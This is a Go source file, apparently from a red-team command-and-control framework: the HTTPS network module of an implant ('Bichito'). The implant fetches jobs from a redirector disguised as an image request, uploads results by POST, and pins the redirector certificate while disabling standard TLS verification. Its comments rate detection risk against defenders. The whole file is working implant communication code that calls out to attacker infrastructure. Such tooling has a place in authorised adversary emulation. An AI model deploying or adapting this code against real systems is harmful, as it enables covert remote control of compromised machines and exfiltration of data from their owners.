// +build paranoidhttpsgo
//// Listening Network Module for Redirectors ///////////////////////////////////////////////////////////
//
//	 Network Method: Listen to an open port with a HTTPS connection using a personnal certificate
//					 generated previously in Implant Generation. The Bichito checks the target tls
//					 signature to make sure is the redirector
//
//   Warnings:       Could not work with MITM tls proxies, and could alert Blues					 
//					 
//	 Fingenprint:    GO-LANG TLS Libraries (target OS network stack?)
//
//   IOC Level:      Medium
//   
//
///////////////////////////////////////////////////////////////////////////////////////////////////////


package network

import (

	"crypto/tls"
	"fmt"
	"strings"
	"bytes"
	"crypto/sha256"
	"encoding/hex"
    "net/http"
    "encoding/json"	
    "net/http/httputil"
    "io/ioutil"
    "time"
    "net"
)

type BiParanoidhttps struct {
	Port string   `json:"port"`
	RedFingenPrint string   `json:"redfingenrpint"`
	Redirectors []string   `json:"redirectors"`
}

var moduleParams *BiParanoidhttps

//Decode Module Parameters, create listener socket and redirectors slice. 
//Redirectors for https paranoid: Domain:Port
//This will be saved on memory till process death.

func PrepareNetworkMocule(jsonstring string) []string{

	var redirectors []string
	errDaws := json.Unmarshal([]byte(jsonstring),&moduleParams)
	if errDaws != nil{
		return redirectors
	}
	for _,red := range moduleParams.Redirectors{
		redirectors = append(redirectors,red +":"+ moduleParams.Port)
	}

	return redirectors
}

//Use Https to retrieve from redirector Jobs for this Bot
func RetrieveJobs(redirector string,authentication string) ([]byte,string){

	var newJobs []byte
	var error string

	result := checkTLSignature(redirector)
	if result != "Good"{
		return newJobs,result
	}
	//Bypass unsecure self-signed certificate
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	client := &http.Client{}
	req, _ := http.NewRequest("GET", "https://"+redirector+"/image.jpg", nil)
	req.Header.Set("Authorization", authentication)
	fmt.Println("trying to connect GET...")
	res, err := client.Do(req)
	if err != nil {
		error = "Connection errir with redirector "+redirector+":"+err.Error()
		return newJobs,error
	}

	//Debug
	requestDump, err2 := httputil.DumpResponse(res, true)
	if err2 != nil {
  		fmt.Println(err2)
	}
	fmt.Println(string(requestDump))


	newJobs,_ = ioutil.ReadAll(res.Body)
    return newJobs,"Success"
}

//Use Https to send a Job to the redirector
func SendJobs(redirector string,authentication string,encodedJob []byte) string{

	var error string

	result := checkTLSignature(redirector)
	if result != "Good"{
		return result
	}
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	
	client := &http.Client{}
	req, _ := http.NewRequest("POST", "https://"+redirector+"/upload",bytes.NewBuffer(encodedJob))
	req.Header.Set("Authorization", authentication)
	
	fmt.Println("trying to connect POST...")
	_, err := client.Do(req)
	if err != nil {
		error = "Connection errir with redirector "+redirector+":"+err.Error()
		return error
	}


	//Debug
	requestDump, err2 := httputil.DumpRequest(req, true)
	if err2 != nil {
  		fmt.Println(err2)
	}
	fmt.Println(string(requestDump))

	return "Success"
}



//This two functions check the Hive Certificate signature to make sure it is the Hive we have installed
func checkTLSignature(redirector string) string{

	var conn net.Conn
	fprint := strings.Replace(moduleParams.RedFingenPrint, ":", "", -1)
	bytesFingerprint, err := hex.DecodeString(fprint)
	if err != nil {
		return "Redirector TLS Error,fingenprint decoding"+err.Error()
	}
	
	config := &tls.Config{InsecureSkipVerify: true}
	
	if conn,err = net.DialTimeout("tcp", redirector,1 * time.Second); err != nil{
		fmt.Println("Dial error")
		return "Redirector TLS Error,Red not reachable"+err.Error()
	}	
	
	tls := tls.Client(conn,config)
	tls.Handshake()

	if ok,err := CheckKeyPin(tls, bytesFingerprint); err != nil || !ok {
		return "Redirector TLS Error,Red suplantation?"
	}

	return "Good"
}

func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool,error) {
	valid := false
	connState := conn.ConnectionState() 
	for _, peerCert := range connState.PeerCertificates { 
			hash := sha256.Sum256(peerCert.Raw)
			if bytes.Compare(hash[0:], fingerprint) == 0 {

				valid = true
			}
	}
	return valid, nil
}

